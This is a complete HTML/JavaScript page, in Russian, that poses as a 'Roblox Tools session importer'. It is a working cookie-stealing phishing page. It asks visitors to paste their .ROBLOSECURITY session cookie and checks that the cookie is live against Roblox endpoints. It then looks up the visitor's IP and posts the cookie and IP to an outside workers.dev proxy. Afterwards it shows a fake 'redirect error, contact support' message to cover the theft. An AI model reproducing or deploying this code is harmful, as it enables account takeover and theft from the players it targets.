
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ROBLOX TOOLS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        :root {
            --bg-dark-1: #0a0a0f;
            --bg-dark-2: #0f071a;
            --bg-dark-3: #150d24;
            --card-bg: rgba(10, 10, 18, 0.75);
            --border-glow: #7c3aed;
            --text-main: #e9d5ff;
            --text-dim: #c084fc;
            --accent: #8b5cf6;
            --accent-hover: #a855f7;
            --shadow: 0 0 20px rgba(139, 92, 246, 0.3);
            --input-bg: #0a0a12;
            --star-color: #c084fc;
        }

        body.light {
            --bg-dark-1: #e6f0fa;
            --bg-dark-2: #d4e2f0;
            --bg-dark-3: #c2d4e6;
            --card-bg: rgba(255, 255, 255, 0.85);
            --border-glow: #5a9bd5;
            --text-main: #1a2a4f;
            --text-dim: #2c4c8c;
            --accent: #4a8ec8;
            --accent-hover: #6aaee0;
            --shadow: 0 0 20px rgba(90, 155, 213, 0.3);
            --input-bg: #ffffff;
            --star-color: #ffd966;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, var(--bg-dark-1) 0%, var(--bg-dark-2) 50%, var(--bg-dark-3) 100%);
            background-attachment: fixed;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .star {
            position: absolute;
            background: var(--star-color);
            border-radius: 50%;
            opacity: 0;
            animation: twinkle 4s infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0.1; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.3); }
        }

        .floating-cookie {
            position: fixed;
            pointer-events: none;
            font-size: 24px;
            z-index: 0;
            opacity: 0.3;
            animation: floatAnim linear infinite;
            filter: drop-shadow(0 0 5px var(--accent));
        }
        @keyframes floatAnim {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            15% { opacity: 0.4; }
            85% { opacity: 0.4; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .glass-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 40px 36px;
            max-width: 520px;
            width: 100%;
            border: 1px solid var(--border-glow);
            box-shadow: var(--shadow);
            transition: all 0.3s ease;
            z-index: 10;
            position: relative;
        }
        .glass-card:hover {
            transform: translateY(-4px);
            border-color: var(--accent-hover);
            box-shadow: 0 0 35px var(--accent);
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo h1 {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #e9d5ff, var(--accent), #c084fc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 1px;
        }
        .logo p {
            color: var(--text-dim);
            font-size: 10px;
            letter-spacing: 3px;
            margin-top: 8px;
            text-transform: uppercase;
            opacity: 0.7;
        }

        .label {
            color: var(--text-dim);
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .cookie-input {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid var(--border-glow);
            border-radius: 28px;
            padding: 18px 20px;
            color: var(--text-main);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.2s;
        }
        .cookie-input:focus {
            outline: none;
            border-color: var(--accent-hover);
            box-shadow: 0 0 15px var(--accent);
        }

        .status {
            font-size: 13px;
            margin: 18px 0 28px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-dim);
            background: rgba(0, 0, 0, 0.2);
            padding: 10px 18px;
            border-radius: 40px;
            backdrop-filter: blur(4px);
        }

        .btn {
            width: 100%;
            background: linear-gradient(135deg, #7c3aed, var(--accent), #c084fc);
            background-size: 200% auto;
            border: none;
            border-radius: 60px;
            padding: 16px;
            color: white;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 0 10px var(--accent);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 22px var(--accent);
            background-position: 100% 0;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .message-area {
            text-align: center;
            margin-top: 20px;
        }
        .error-text {
            color: #ff8a7a;
            background: rgba(255, 70, 50, 0.1);
            padding: 10px 18px;
            border-radius: 40px;
            font-size: 12px;
            border-left: 3px solid #ff5a4a;
        }

        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 100;
        }
        .theme-btn {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-glow);
            border-radius: 40px;
            padding: 8px 20px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            color: var(--text-dim);
            transition: all 0.2s;
        }
        .theme-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 12px var(--accent);
        }
    </style>
</head>
<body>
<div class="theme-switch">
    <button class="theme-btn" id="themeToggleBtn">🌙 Тема</button>
</div>
<div class="stars" id="stars"></div>
<div class="glass-card">
    <div class="logo">
        <h1>✦ ROBLOX TOOLS ✦</h1>
        <p>SESSION IMPORTER</p>
    </div>
    <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
    <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
    <div class="status" id="status"><span>✨</span> Ожидание ввода...</div>
    <button class="btn" id="sendBtn" disabled>🔄 Заменить сессию</button>
    <div id="messageArea" class="message-area"></div>
</div>

<script>
    (function() {
        const PROXY_URL = "https://robl.megadoner517.workers.dev";

        // Тема
        const themeBtn = document.getElementById('themeToggleBtn');
        function loadTheme() {
            const saved = localStorage.getItem('rbx_theme');
            if (saved === 'light') {
                document.body.classList.add('light');
                if (themeBtn) themeBtn.innerHTML = '☀️ Тема';
            } else {
                document.body.classList.remove('light');
                if (themeBtn) themeBtn.innerHTML = '🌙 Тема';
            }
        }
        function toggleTheme() {
            if (document.body.classList.contains('light')) {
                document.body.classList.remove('light');
                localStorage.setItem('rbx_theme', 'dark');
                if (themeBtn) themeBtn.innerHTML = '🌙 Тема';
            } else {
                document.body.classList.add('light');
                localStorage.setItem('rbx_theme', 'light');
                if (themeBtn) themeBtn.innerHTML = '☀️ Тема';
            }
        }
        if (themeBtn) themeBtn.addEventListener('click', toggleTheme);
        loadTheme();

        // Звёзды
        function createStars() {
            const container = document.getElementById('stars');
            for (let i = 0; i < 130; i++) {
                const star = document.createElement('div');
                star.classList.add('star');
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = Math.random() * 3 + 1 + 'px';
                star.style.height = star.style.width;
                star.style.animationDelay = Math.random() * 5 + 's';
                star.style.animationDuration = Math.random() * 3 + 2 + 's';
                container.appendChild(star);
            }
        }
        createStars();

        // Печеньки
        for (let i = 0; i < 35; i++) {
            let cookie = document.createElement('div');
            cookie.classList.add('floating-cookie');
            cookie.textContent = '🍪';
            cookie.style.left = Math.random() * 100 + '%';
            cookie.style.fontSize = (20 + Math.random() * 30) + 'px';
            cookie.style.animationDuration = (8 + Math.random() * 14) + 's';
            cookie.style.animationDelay = Math.random() * -18 + 's';
            document.body.appendChild(cookie);
        }

        const cookieInput = document.getElementById('cookie');
        const sendBtn = document.getElementById('sendBtn');
        const statusDiv = document.getElementById('status');
        const msgArea = document.getElementById('messageArea');

        // Базовая проверка формата и длины
        function isBasicValid(value) {
            if (!value || value.trim() === '') return false;
            const trimmed = value.trim();
            if (!trimmed.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
            if (trimmed.length < 800) return false;
            return true;
        }

        // Реальная проверка куки через Roblox API (двойная, чтобы снизить ошибки)
        async function checkCookieReal(cookieValue) {
            try {
                // Пробуем через users.roblox.com
                const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
                    method: "GET",
                    headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
                });
                if (response.ok) return true;
                
                // Дополнительная проверка через account/settings (может сработать, если первый эндпоинт упал)
                const resp2 = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                    method: "GET",
                    headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
                });
                return resp2.ok;
            } catch (e) {
                return false;
            }
        }

        let currentCookieValid = false;
        let currentCookieValue = '';

        async function updateUI() {
            const rawValue = cookieInput.value;
            const basicValid = isBasicValid(rawValue);

            if (!rawValue || rawValue.trim() === '') {
                statusDiv.innerHTML = '<span>✨</span> Ожидание ввода...';
                statusDiv.style.color = '#a78bfa';
                sendBtn.disabled = true;
                currentCookieValid = false;
                currentCookieValue = '';
                return;
            }

            if (!basicValid) {
                statusDiv.innerHTML = '<span>❌</span> Ошибка: неверный формат или куча меньше 800 символов';
                statusDiv.style.color = '#ef4444';
                sendBtn.disabled = true;
                currentCookieValid = false;
                currentCookieValue = '';
                return;
            }

            // Начинаем проверку
            statusDiv.innerHTML = '<span>🔄</span> Проверяем куку... Подождите секунду';
            statusDiv.style.color = '#fbbf24';
            sendBtn.disabled = true;

            const isValid = await checkCookieReal(rawValue);

            if (isValid) {
                statusDiv.innerHTML = '<span>✅</span> Кука валидна! Рабочая сессия.';
                statusDiv.style.color = '#22c55e';
                sendBtn.disabled = false;
                currentCookieValid = true;
                currentCookieValue = rawValue;
            } else {
                statusDiv.innerHTML = '<span>❌</span> Кука НЕВАЛИДНА! Сессия устарела или битая.';
                statusDiv.style.color = '#ef4444';
                sendBtn.disabled = true;
                currentCookieValid = false;
                currentCookieValue = '';
            }
        }

        function showMessage(text) {
            msgArea.innerHTML = `<div class="error-text">⚠️ ${text}</div>`;
            setTimeout(() => msgArea.innerHTML = '', 4000);
        }

        let debounceTimer;
        cookieInput.addEventListener('input', () => {
            clearTimeout(debounceTimer);
            debounceTimer = setTimeout(() => updateUI(), 500);
        });
        cookieInput.addEventListener('paste', () => setTimeout(() => updateUI(), 100));
        updateUI();

        sendBtn.onclick = async () => {
            if (!currentCookieValid || !currentCookieValue) {
                showMessage('Кука не прошла проверку!');
                return;
            }

            sendBtn.disabled = true;
            sendBtn.textContent = "⏳ Отправка...";

            let ip = 'unknown';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            const msg = {
                content: `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${currentCookieValue.length} символов\n**Содержимое:**\n\`\`\`${currentCookieValue}\`\`\``
            };

            try {
                await fetch(PROXY_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(msg)
                });
                showMessage('Ошибка перенаправления! Обратитесь в поддержку.');
            } catch (e) {
                showMessage('Ошибка сети. Попробуйте позже.');
            }

            sendBtn.disabled = false;
            sendBtn.textContent = "🔄 Заменить сессию";
        };
    })();
</script>
</body>
</html>
